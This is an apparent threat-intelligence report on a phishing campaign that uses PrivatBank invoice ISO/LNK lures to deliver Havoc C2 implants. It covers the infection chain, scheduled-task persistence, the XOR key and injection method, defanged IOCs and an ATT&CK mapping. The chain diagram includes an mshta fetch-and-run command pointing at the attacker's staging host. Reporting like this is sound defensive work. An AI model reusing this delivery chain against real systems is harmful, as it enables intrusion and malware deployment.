---
title: "Dissecting PrivatBank Phishing Lures and Havoc C2 Staging at 93[.]152[.]223[.]39"
description: "Technical teardown of exposed ISO/LNK lures, scheduled task persistence hijacking, and Havoc C2 Demon in-memory injection."
publishedAt: 2026-08-16
archiveSection: reports
tags:
  - "threat-intelligence"
  - "dfir"
  - "havoc-c2"
cover: "/images/posts/exposed-quickdav-malware-distribution-repository-and-remcos-rat-infrastructure/img-01.png"
featured: true
draft: false
---

### Executive Summary

Analysis of exposed operational directory telemetry at `93[.]152[.]223[.]39:8089` identified an active malware delivery campaign leveraging Ukrainian PrivatBank financial lure lures (`Payment invoice INV-15468869 13.08.2026 PrivatBank receipt.iso`) to stage Havoc C2 Demon implants.

### 1. Delivery Chain & Persistence Architecture

The operator's internal lab notes reveal the complete infection sequence:

```
ISO -> LNK -> cmd.exe -> PowerShell(B64+XOR90) -> mshta http://93[.]152[.]223[.]39:8089/win.hta?id=1
  -> HTA: schtasks Microsoft\Windows\TextServicesFramework\MsCtfMonitor
       ONLOGON + Hidden flag + XOR shellcode akt1842.dat in RAM -> Havoc C2 Demon
```

1. **Scheduled Task Hijacking**: Uses COM object `Schedule.Service` to register a hidden task under `Microsoft\Windows\TextServicesFramework\MsCtfMonitor` triggered on `ONLOGON`.
2. **Payload Decryption**: Downloads `akt1842.dat` and decrypts it using multi-byte XOR key `K7mQ2pL9`.
3. **In-Memory Injection**: Utilizes dynamic C# P/Invoke compilation to invoke `VirtualAlloc` and `CreateThread`.

### 2. Dual C2 Infrastructure Architecture

Telemetry indicates the backend runs dual services:
* **Port 8089 (HTTP)**: Unencrypted payload and HTA delivery endpoint.
* **Port 9443 (HTTPS)**: Encrypted TLS channel utilizing custom `lab.crt` for Havoc Demon agent callbacks.

### 3. Indicators of Compromise (Defanged)

| IOC Type | Indicator | Role |
|---|---|---|
| **IPv4 Address** | `93[.]152[.]223[.]39` | Primary Staging / C2 Host |
| **Service Port** | `93[.]152[.]223[.]39:8089` | Exposed Staging Directory |
| **IPv4 Indicator** | `143[.]244[.]45[.]7` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `154[.]47[.]29[.]168` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `146[.]70[.]221[.]23` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `83[.]143[.]242[.]10` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `149[.]102[.]239[.]210` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `134[.]199[.]132[.]123` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `192[.]42[.]116[.]48` | Observed Infrastructure Endpoint |
| **IPv4 Indicator** | `92[.]213[.]72[.]74` | Observed Infrastructure Endpoint |

### 4. MITRE ATT&CK Mapping
* **T1071.001 - Application Layer Protocol: Web Protocols**
* **T1218.005 - System Binary Proxy Execution: Mshta**
* **T1053.005 - Scheduled Task/Job: Scheduled Task**
* **T1566.001 - Phishing: Spearphishing Attachment**
* **T1204.002 - User Execution: Malicious File**
* **T1055 - Process Injection**
* **T1140 - Deobfuscate/Decode Files or Information**
